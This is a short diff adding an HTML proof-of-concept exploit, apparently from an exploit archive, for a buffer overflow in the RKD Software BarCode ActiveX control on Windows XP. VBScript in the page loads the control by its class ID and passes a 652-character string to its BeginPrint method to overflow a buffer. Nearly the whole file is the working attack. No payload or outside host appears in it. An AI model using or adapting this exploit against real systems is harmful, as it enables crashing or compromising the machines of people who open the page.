@@ -1,0 +1,21 @@
+&lt;!--
+
+RKD Software BarCode ActiveX Control BarCodeAx.DLL Buffer Overflow POC
+By Parveen Vashishtha
+
+Desc:
+This is just POC.
+
+Tested on Windows XP SP2 English fully patched.
+
+--&gt;
+
+&lt;html&gt;
+&lt;object classid=&#039;clsid:C26D9CA8-6747-11D5-AD4B-C01857C10000&#039; id=&#039;rkd&#039;&gt;&lt;/object&gt;
+&lt;script language=&#039;vbscript&#039;&gt;
+
+var=String(652, &quot;A&quot;)
+
+rkd.BeginPrint var 
+
+&lt;/script&gt;&lt;/html&gt;
